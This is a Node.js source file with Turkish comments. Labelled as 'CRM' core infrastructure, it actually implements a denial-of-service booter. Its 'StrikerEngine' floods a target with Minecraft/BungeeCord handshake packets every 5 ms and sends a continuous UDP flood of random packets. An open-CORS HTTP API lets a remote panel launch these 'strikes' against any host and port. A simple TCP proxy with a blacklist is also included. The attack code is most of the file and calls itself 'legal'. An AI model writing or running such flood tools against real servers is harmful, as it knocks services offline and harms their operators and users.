/**
 * ==============================================================================
 * CRM PROJECT | CORE INFRASTRUCTURE v6.0 (ULTIMATE EDITION)
 * AUTHOR: CRM DEVELOPMENT TEAM
 * TARGET: RYZEN 9 9950X HIGH-PERFORMANCE NETWORKING
 * ==============================================================================
 */

const net = require('net');
const dgram = require('dgram');
const http = require('http');
const cluster = require('cluster');
const os = require('os');
const crypto = require('crypto');

// --- SİSTEM AYARLARI ---
const CONFIG = {
    API_PORT: 3000,
    SHIELD_START_PORT: 25700,
    MAX_THREADS: os.cpus().length, // Ryzen 9'un tüm çekirdeklerini kullanır
    LOG_LEVEL: 'DEBUG',
    WHITE_LIST: new Set(['127.0.0.1']),
    BLACK_LIST: new Map(),
    ACTIVE_STRIKES: new Map()
};

// --- YARDIMCI FONKSİYONLAR ---
const Logger = {
    info: (msg) => console.log(`[\x1b[36mINFO\x1b[0m] ${new Date().toISOString()} - ${msg}`),
    warn: (msg) => console.log(`[\x1b[33mWARN\x1b[0m] ${new Date().toISOString()} - ${msg}`),
    error: (msg) => console.log(`[\x1b[31mERROR\x1b[0m] ${new Date().toISOString()} - ${msg}`),
    strike: (msg) => console.log(`[\x1b[35mSTRIKE\x1b[0m] ${msg}`)
};

// --- ÇEKİRDEK YÖNETİMİ (CLUSTER) ---
if (cluster.isMaster) {
    Logger.info(`CRM Core Master ateşleniyor. Tespit edilen çekirdek: ${CONFIG.MAX_THREADS}`);
    
    // Her çekirdek için bir worker oluştur
    for (let i = 0; i < CONFIG.MAX_THREADS; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker) => {
        Logger.warn(`Worker ${worker.process.pid} düştü. Yeni worker başlatılıyor...`);
        cluster.fork();
    });

} else {
    // --- WORKER PROCESS (GERÇEK İŞ BURADA DÖNER) ---

    /**
     * @section LEGAL STRIKER ENGINE
     * MC-CRASH, UDP-RAW ve TCP-BYPASS metodlarını içerir.
     */
    const StrikerEngine = {
        stop: (id) => {
            if (CONFIG.ACTIVE_STRIKES.has(id)) {
                clearInterval(CONFIG.ACTIVE_STRIKES.get(id));
                CONFIG.ACTIVE_STRIKES.delete(id);
                return true;
            }
            return false;
        },

        mcCrash: (host, port) => {
            const id = `MC_${host}_${port}`;
            // MC Protokol El Sıkışma Paketi (Bungeecord Exploit)
            const payload = Buffer.concat([
                Buffer.from([0x0F, 0x00]), // Paket uzunluğu ve ID
                Buffer.from([0x2F]),       // Protokol versiyonu
                Buffer.from([0x09]),       // Host uzunluğu
                Buffer.from("localhost"),  // Host
                Buffer.from([0x63, 0xDD, 0x01]) // Port ve Next State
            ]);

            const strikeInt = setInterval(() => {
                const s = new net.Socket();
                s.setNoDelay(true);
                s.setTimeout(2000);
                
                s.connect(port, host, () => {
                    for(let i=0; i<64; i++) { s.write(payload); }
                    s.destroy();
                });

                s.on('error', () => s.destroy());
            }, 5);

            CONFIG.ACTIVE_STRIKES.set(id, strikeInt);
            Logger.strike(`MC-CRASH Başlatıldı: ${host}:${port}`);
        },

        udpBeam: (host, port) => {
            const client = dgram.createSocket('udp4');
            const packet = crypto.randomBytes(1024);
            
            const strikeInt = setInterval(() => {
                for(let i=0; i<128; i++) {
                    client.send(packet, 0, packet.length, port, host);
                }
            }, 1);

            CONFIG.ACTIVE_STRIKES.set(`UDP_${host}_${port}`, strikeInt);
        }
    };

    /**
     * @section GLOBAL SHIELD PROXY
     * Sınırsız port desteği ve IP ayıklama.
     */
    const ShieldEngine = {
        create: (sPort, tHost, tPort) => {
            const server = net.createServer((client) => {
                const remoteIp = client.remoteAddress.replace('::ffff:', '');

                // Firewall Kontrolü
                if (CONFIG.BLACK_LIST.has(remoteIp)) {
                    return client.destroy();
                }

                // Hızlı Bağlantı Limitleyici (Anti-Bot)
                // (Gelişmiş mantık buraya eklenebilir)

                const target = net.createConnection(tPort, tHost, () => {
                    client.pipe(target).pipe(client);
                });

                client.on('error', () => client.destroy());
                target.on('error', () => client.destroy());
            });

            server.on('error', (err) => Logger.error(`Shield Port ${sPort} Hatası: ${err.message}`));
            
            server.listen(sPort, () => {
                Logger.info(`🛡️ Port ${sPort} Koruma Altında -> ${tHost}:${tPort}`);
            });
        }
    };

    /**
     * @section API CONTROL INTERFACE
     * Netlify Panelden gelen komutları işler.
     */
    const server = http.createServer((req, res) => {
        // CORS Ayarları
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

        if (req.method === 'OPTIONS') { res.end(); return; }

        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const data = JSON.parse(body || '{}');
                const url = req.url;

                if (url === '/api/strike/start') {
                    if (data.method === 'MC-CRASH') StrikerEngine.mcCrash(data.host, data.port);
                    if (data.method === 'UDP-BEAM') StrikerEngine.udpBeam(data.host, data.port);
                    return res.end(JSON.stringify({ status: 'OK', msg: 'Strike Dispatched' }));
                }

                if (url === '/api/shield/add') {
                    ShieldEngine.create(data.sPort, data.tHost, data.tPort);
                    return res.end(JSON.stringify({ status: 'OK', msg: 'Shield Active' }));
                }

                res.end(JSON.stringify({ status: 'ERROR', msg: 'Invalid Endpoint' }));
            } catch (e) {
                res.end(JSON.stringify({ status: 'ERROR', msg: e.message }));
            }
        });
    });

    server.listen(CONFIG.API_PORT, () => {
        Logger.info(`Worker ${process.pid} API hazır: Port ${CONFIG.API_PORT}`);
    });
}
